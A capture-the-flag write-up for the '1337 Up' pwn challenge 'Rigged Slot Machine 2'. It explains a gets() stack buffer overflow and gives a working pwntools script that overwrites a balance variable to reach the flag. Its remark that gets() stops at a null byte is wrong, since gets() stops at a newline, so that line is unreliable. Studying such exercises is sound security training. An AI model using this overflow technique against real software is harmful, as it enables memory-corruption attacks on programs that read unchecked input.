# 1337 Up | Rigged Slot Machine 2 - PWN (100)

This challenge involved exploiting a buffer overflow vulnerability to overwrite values on the stack.
One of these values is your current balance.
By exploiting the buffer overflow vulnerability, you can set the balance to `1337420` and get the flag.

## Initial Analysis
Looking at the `main` function, there is a call to `enter_name` which has a buffer overflow vulnerability.

``` c
void enter_name(char *param_1) {
  puts("Enter your name:");
  gets(param_1);
  printf("Welcome, %s!\n",param_1);
  return;
}
```

`gets()` will read an unlimited amount of bytes till it hits a null byte.

Further into `main` there is a call to `play()`, after this call it checks to see the current user's balance

``` c
play(bet_amount, &current_balance);
if (current_balance == 1337420) {
    payout(&current_balance);
}
```

`play()` has a betting game which determines how much the player gets

``` c
rand_num = rand();
roll = rand_num % 1000;

if (iVar2 == 0) { modifier = 10; }
else if (iVar2 < 5) { modifier = 5; }
else if (iVar2 < 10) { modifier = 3; }
else if (iVar2 < 0xf) { modifier = 2; }
else if (iVar2 < 0x1e) { modifier = 1; }
else { modifier = 0; }

winnings = (bet_amount * modifier) - bet_amount;
if (winnings == 0) {
    puts("No win, no loss this time.");
} else if (winnings < 0) {
    printf("You lost $%d.\n", winnings);
} else {
    printf("You won $%d!\n", winnings);
}
*current_balance = *current_balance + winnings;
```

If the `current_balance` is `1337420`, then it will call `payout()` which prints the flag.

Summarizing this we have:
- buffer overflow which lets us modify the `current_balance`
- setting the `current_balance` to `1337420` calls `payout()` to print the flag

## Exploitation
Exploiting this buffer is pretty easy, the name buffer is located at `local_28`, and the current balance is at `local_14`. To overwrite into the current balance it would need `0x28-0x14=0x14` byte overwrite to then write a value into the buffer.

However we cant write `1337420` in the `current_balance` buffer because `play()` will be called first, which will change the value of `current_balance`. Since the most likely outcome is to lose money `roll < 0x1e`, we can bet one coin with the intent to lose it. This changes the value to `1337421` that we will need to write.

## Solve
``` python
from pwn import *

BINARY = './rigged_slot2'
HOST = ''
GDB_SCRIPT = ''

def play_game():
    proc = get_process() # set is_remote = False for local testing
    
    payload = b''.join([
      b'A'*0x14,
      p64(0x14684c+1), # Chance we will lose a coin, add one in case
    ])
    
    proc.sendlineafter(b'Enter your name:', payload)
    proc.sendlineafter(b': ', b'1')

    return proc

def main():
    while True: 
        proc = play_game()
        line = proc.recvline().strip().decode()
        if 'You lost $1.' == line:
            proc.recvuntil(b'You\'ve won the jackpot! Here is your flag: ')
            flag = proc.recvline().strip().decode()
            print(f'Flag: {flag}')
            break
             
    
# Allows compatibility if custom library isn't present
try:
    from ctfkit.bp import *
    tpwn.GDB_SCRIPT = GDB_SCRIPT
except ImportError:
    def get_process(is_remote=True):
        host, port = HOST.split(':')
        return remote(host, int(port)) if is_remote else process()

if __name__ == '__main__':
    try:
        context.binary = BINARY
    except FileNotFoundError:
        print('Not able to load binary, local testing disabled')
    context.log_level = 'error'
    context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

    parse_args()
    main()
```